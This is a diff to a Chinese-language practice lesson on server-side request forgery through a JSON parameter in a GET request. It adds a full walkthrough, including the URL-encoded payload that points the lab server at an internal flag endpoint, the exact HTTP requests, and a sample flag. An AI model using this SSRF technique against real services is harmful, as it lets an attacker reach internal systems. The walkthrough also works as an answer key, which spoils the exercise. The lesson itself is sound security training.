@@ -13,7 +13,7 @@ difficulty: practitioner
 /ssrf/json-in-get?json={"abc": 123, "ref": "http://example.com"}
 ```
 
-攻击面本质没变（还是"服务端替你请求"），但构造复杂度上来了：JSON 里的引号、花括号进 URL 前都要**正确编码**，一个字符错就整条失效。
+靶场只认 `ref` 字段：JSON 里没有 `ref` 会直接回 `no ref in json found!`，JSON 格式错误回 `JSON Syntax Error: ...`。攻击面本质没变（还是"服务端替你请求"），但构造复杂度上来了——JSON 里的引号、花括号进 URL 前都要**正确编码**，一个字符错就整条失效。
 
 ## Yakit 操作步骤
 
@@ -29,11 +29,68 @@ difficulty: practitioner
 
 ## 开始实战
 
-点击 **前往配套题目练习**，启动环境后：
+点击 **前往配套题目练习**，启动环境后：构造只含 `ref` 字段、指向 `http://127.0.0.1:8787/ssrf/flag` 的 JSON，URL 编码后作为 `json` 参数发给 `/ssrf/json-in-get`，从响应原文里拿到 flag 提交（与上一课同源，正则判定，拿到哪个交哪个）。
 
-1. 观察靶机 `/ssrf/json-in-get` 对普通 JSON 的响应；
-2. 构造只含 `ref` 字段、指向 `http://127.0.0.1:8787/ssrf/flag` 的 JSON，URL 编码后作为 `json` 参数发送；
-3. 拿到 flag 提交（与上一课同源，正则判定）。
+<details>
+<summary>📋 详细步骤（点击展开，照做即可拿到答案）</summary>
+
+以下以实例地址 `http://127.0.0.1:36870` 为例——**端口每次启动环境都随机分配，请替换成你题目页显示的端口**。
+
+**第 1 步：启动实验环境**
+
+题目详情页点「启动实验环境」，等状态 running，复制访问地址（形如 `http://127.0.0.1:36870`）。
+
+**第 2 步：先感受"没有 ref"的报错**
+
+```http
+GET /ssrf/json-in-get?json=%7B%22abc%22%3A123%7D HTTP/1.1
+Host: 127.0.0.1:36870
+```
+
+（`%7B%22abc%22%3A123%7D` 是 `{"abc":123}` 的 URL 编码。）响应：
+
+```
+no ref in json found!
+```
+
+——确认服务端解析了 JSON 并在找 `ref` 字段。
+
+**第 3 步：构造带 ref 的 payload 并整体 URL 编码**
+
+原始 JSON（只留 `ref` 一个字段就够）：
+
+```json
+{"ref":"http://127.0.0.1:8787/ssrf/flag"}
+```
+
+用 Codec 做 URL 编码后得到：
+
+```
+%7B%22ref%22%3A%22http%3A%2F%2F127.0.0.1%3A8787%2Fssrf%2Fflag%22%7D
+```
+
+**第 4 步：发送请求**
+
+```http
+GET /ssrf/json-in-get?json=%7B%22ref%22%3A%22http%3A%2F%2F127.0.0.1%3A8787%2Fssrf%2Fflag%22%7D HTTP/1.1
+Host: 127.0.0.1:36870
+```
+
+响应是靶机自己请求 `/ssrf/flag` 后**原样转发**的响应原文（状态行 + 响应头 + HTML），在 body 末尾的 `<div>` 里：
+
+```html
+<div>
+	flag{3aa727b8-1fa3-4570-9f14-759c9905b499}
+</div>
+```
+
+（uuid 每次请求都不同，属正常现象。）
+
+**第 5 步：提交答案**
+
+回到题目详情页，提交你拿到的完整 `flag{uuid}` 原文。
+
+</details>
 
 ## 延伸：SSRF 防御面面观
 
